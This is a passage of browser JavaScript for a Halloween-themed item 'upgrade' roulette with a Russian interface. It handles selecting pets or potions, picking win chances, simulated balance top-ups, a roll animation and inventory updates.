
        const disabled =

          !source.itemId ||

          variant.price <=
          source.price;


        const row =
          document.createElement(
            "button"
          );


        row.type =
          "button";


        row.className =
          "selection-row";


        row.innerHTML = `

          <div class="selection-art">

            <img alt="">

            <span>
              ${item.fallback || "🐾"}
            </span>

          </div>


          <div
            class="selection-details"
          >

            <b>
              ${item.name}
            </b>

            <span>
              ${item.rarity}
            </span>

            <strong>
              ${money(variant.price)}
            </strong>

          </div>


          <span class="selection-type">

            ${
              disabled
              ? "НИЖЕ"
              : "ЦЕЛЬ"
            }

          </span>

        `;


        if(disabled){

          row.style.opacity =
            ".42";

        }


        loadImage(

          row.querySelector("img"),

          row.querySelector(
            ".selection-art span"
          ),

          item

        );


        row.addEventListener(
          "click",
          ()=>{

            if(disabled){

              showToast(
                "Цель должна быть дороже твоего предмета"
              );

              return;

            }


            target =
              {
                ...variant
              };


            closeModal(
              "selectionModal"
            );


            updateCards();

          }
        );


        list.appendChild(
          row
        );

      }
    );

}


$("sourceButton")
  .addEventListener(
    "click",
    ()=>{

      openSelection(
        "source"
      );

    }
  );


$("targetButton")
  .addEventListener(
    "click",
    ()=>{

      openSelection(
        "target"
      );

    }
  );


$("itemSearch")
  .addEventListener(
    "input",
    event=>{

      renderSelection(
        event.target.value
      );

    }
  );


/* ==========================================================
   CHANCE BUTTONS
========================================================== */

document
  .querySelectorAll(
    ".chance-btn"
  )
  .forEach(button=>{

    button.addEventListener(
      "click",
      ()=>{

        if(
          !source.itemId
        ){

          showToast(
            "Сначала купи предмет"
          );

          return;

        }


        const chance =
          Number(
            button.dataset.chance
          );


        selectedChance =
          chance;


        const wantedPrice =

          source.price *
          (98 / chance);


        const candidates =
          currentItems()
            .map(
              item =>
                createVariant(
                  item,
                  emptyProperties()
                )
            )
            .filter(
              variant =>
                variant.price >
                source.price
            );


        if(!candidates.length){

          updateCards();

          return;

        }


        candidates.sort(
          (a,b)=>
            Math.abs(
              a.price -
              wantedPrice
            )
            -
            Math.abs(
              b.price -
              wantedPrice
            )
        );


        target =
          {
            ...candidates[0]
          };


        updateCards();

      }
    );

  });


/* ==========================================================
   DEPOSIT
========================================================== */

$("depositButton")
  .addEventListener(
    "click",
    ()=>{

      updateBalance();

      $("depositAmount")
        .value = "";

      openModal(
        "depositModal"
      );

    }
  );


document
  .querySelectorAll(
    ".quick-deposit button"
  )
  .forEach(button=>{

    button.addEventListener(
      "click",
      ()=>{

        const amount =
          Number(
            button.dataset.add
          );


        balance +=
          amount;


        updateBalance();


        showToast(
          `Баланс пополнен на ${money(
            amount
          )}`
        );

      }
    );

  });


$("depositSubmit")
  .addEventListener(
    "click",
    ()=>{

      const amount =
        Number(
          $("depositAmount").value
        );


      if(
        !Number.isFinite(
          amount
        )
        ||
        amount <= 0
      ){

        showToast(
          "Введи корректную сумму"
        );

        return;

      }


      balance +=
        Math.floor(
          amount
        );


      updateBalance();


      closeModal(
        "depositModal"
      );


      showToast(
        `Баланс пополнен на ${money(
          amount
        )}`
      );

    }
  );


/* ==========================================================
   ROBUX
========================================================== */

$("robuxButton")
  .addEventListener(
    "click",
    ()=>{

      openModal(
        "robuxModal"
      );

    }
  );


$("rubButton")
  .addEventListener(
    "click",
    ()=>{

      showToast(
        "Технические работы — покупка будет доступна совсем скоро"
      );

    }
  );


$("uahButton")
  .addEventListener(
    "click",
    ()=>{

      showToast(
        "Технические работы — покупка будет доступна совсем скоро"
      );

    }
  );


/* ==========================================================
   CLOSE MODALS
========================================================== */

document
  .querySelectorAll(
    "[data-close]"
  )
  .forEach(
    button=>{

      button.addEventListener(
        "click",
        ()=>{

          closeModal(
            button.dataset.close
          );

        }
      );

    }
  );


/* ==========================================================
   ROLL
========================================================== */

function createRollCard(
  won
){

  const card =
    document.createElement(
      "div"
    );


  card.className =
    "roll-card";


  card.innerHTML = `

    <span class="emoji">
      ${won ? "🎃" : "💀"}
    </span>

    <span class="label">
      ${won ? "ВЫИГРЫШ" : "НЕУДАЧА"}
    </span>

  `;


  return card;

}


function animateRoll(
  won
){

  return new Promise(
    resolve=>{

      const screen =
        $("rollScreen");


      const track =
        $("rollTrack");


      const total =
        52;


      const finalIndex =
        38;


      track.innerHTML =
        "";


      track.style.transition =
        "none";


      track.style.transform =
        "translateX(0)";


      for(
        let i=0;
        i<total;
        i++
      ){

        track.appendChild(

          createRollCard(

            i === finalIndex

            ? won

            : Math.random() < .5

          )

        );

      }


      screen
        .classList
        .remove(
          "hidden"
        );


      requestAnimationFrame(()=>{

        requestAnimationFrame(()=>{

          const card =
            track.children[
              finalIndex
            ];


          const width =
            document
              .querySelector(
                ".roll-window"
              )
              .getBoundingClientRect()
              .width;


          const offset =

            width / 2
            -
            (
              card.offsetLeft
              +
              card.offsetWidth / 2
            );


          track.style.transition =
            "transform 3.8s cubic-bezier(.08,.72,.12,1)";


          track.style.transform =
            `translateX(${offset}px)`;


          setTimeout(
            ()=>{

              screen
                .classList
                .add(
                  "hidden"
                );


              resolve();

            },
            4000
          );

        });

      });

    }
  );

}


/* ==========================================================
   UPGRADE
========================================================== */

async function upgrade(){

  if(rolling){
    return;
  }


  /*
    Нет source
  */

  if(

    !source.itemId ||

    !source.inventoryKey ||

    !inventory.has(
      source.inventoryKey
    )

  ){

    showToast(
      "Сначала купи предмет и выбери его из инвентаря"
    );

    return;

  }


  /*
    Проверяем target
  */

  if(

    !target.itemId ||

    target.price <=
    source.price

  ){

    showToast(
      "Цель должна быть дороже твоего предмета"
    );

    return;

  }


  const chance =
    displayedChance();


  const won =
    fairOutcome(
      chance
    );


  rolling = true;


  $("upgradeButton")
    .disabled = true;


  attempts++;


  /*
    Забираем source.
  */

  const spentSource =
    {
      ...source
    };


  removeInventory(

    source.inventoryKey,

    1

  );


  /*
    WIN
  */

  if(won){

    wins++;


    addInventory(
      target,
      1
    );

  }


  /*
    LOSS
  */

  else{

    losses++;

  }


  renderInventory();

  updateStats();


  await animateRoll(
    won
  );


  $("resultEmoji")
    .textContent =
      won
      ? "🎃"
      : "💀";


  $("resultTitle")
    .textContent =
      won
      ? "ВЫИГРЫШ"
      : "ПРОИГРЫШ";


  if(won){

    $("resultInfo").innerHTML = `

      <span>
        Шанс:
        <b>
          ${chance.toFixed(1)}%
        </b>
      </span>

      <span class="green">
        + ${target.name}
        ${target.variantLabel !== "Обычный"
          ? ` • ${target.variantLabel}`
          : ""
        }
      </span>

      <span>
        Предмет добавлен в инвентарь
      </span>

    `;

  }else{

    $("resultInfo").innerHTML = `

      <span>
        Шанс:
        <b>
          ${chance.toFixed(1)}%
        </b>
      </span>

      <span class="red">
        − ${spentSource.name}
        ${
          spentSource.variantLabel !== "Обычный"
          ? ` • ${spentSource.variantLabel}`
          : ""
        }
      </span>

      <span>
        Предмет потерян
      </span>

    `;

  }


  $("resultScreen")
    .classList
    .remove(
      "hidden"
    );


  rolling = false;


  $("upgradeButton")
    .disabled = false;


  /*
    После апгрейда
    выбираем оставшийся предмет
    той же категории.
  */

  const owned =
    inventoryItems()
      .find(
        variant=>{

          if(
            category === "pet"
          ){

            return ITEMS.pet.some(
              item =>
                item.id ===
                variant.itemId
            );

          }


          return ITEMS.potion.some(
            item =>
              item.id ===
              variant.itemId
          );

        }
      );


  if(owned){

    source =
      {
        ...owned
      };

  }else{

    source = {

      inventoryKey:null,

      itemId:null,

      name:"Нет предмета",

      rarity:
        "ИНВЕНТАРЬ ПУСТ",

      price:0,

      image:"",

      fallback:"🎒",

      variantKey:
        "normal",

      variantLabel:
        "Обычный",

      properties:
        emptyProperties()

    };

  }


  /*
    Новая ближайшая цель.
  */

  if(
    source.itemId
  ){

    const next =
      currentItems()
        .map(
          item =>
            createVariant(
              item,
              emptyProperties()
            )
        )
        .find(
          variant =>
            variant.price >
            source.price
        );


    if(next){

      target =
        {
          ...next
        };

    }

  }


  updateCards();

  renderInventory();

}


/* ==========================================================
   UPGRADE BUTTON
========================================================== */

$("upgradeButton")
  .addEventListener(
    "click",
    upgrade
  );


/* ==========================================================
   CLOSE RESULT
========================================================== */

$("closeResult")
  .addEventListener(
    "click",
    ()=>{

      $("resultScreen")
        .classList
        .add(
          "hidden"
        );

    }
  );


/* ==========================================================
   HALLOWEEN DECOR
========================================================== */

function spawnDecor(){

  const root =
    $("fallingDecor");


  const icons = [

    "🎃",

    "🍂",

    "🕸️",

    "🦇"

  ];


  for(
    let i=0;
    i<24;
    i++
  ){

    const node =
      document.createElement(
        "span"
      );


    node.className =
      "fall";


    node.textContent =

      icons[
        Math.floor(
          Math.random() *
          icons.length
        )
      ];


    node.style.left =
      `${Math.random()*100}%`;


    node.style.fontSize =
      `${9 + Math.random()*12}px`;


    node.style.animationDelay =
      `${-Math.random()*15}s`;


    node.style.animationDuration =
      `${8 + Math.random()*9}s`;


    root.appendChild(
      node
    );

  }

}


/* ==========================================================
   INIT
========================================================== */

renderShop();

renderInventory();

updateCards();

updateBalance();

updateStats();

spawnDecor();
